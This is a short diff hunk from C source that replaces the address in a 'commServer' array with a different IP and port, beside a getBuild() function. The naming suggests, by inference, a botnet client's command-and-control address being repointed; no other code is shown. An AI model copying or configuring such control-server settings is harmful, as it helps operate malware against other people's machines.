@@ -50,7 +50,7 @@
 
 
 
-unsigned char *commServer[] = { "168.235.109.208:6963" };
+unsigned char *commServer[] = { "143.198.150.34:1590" };
 
 
 char *getBuild() { 
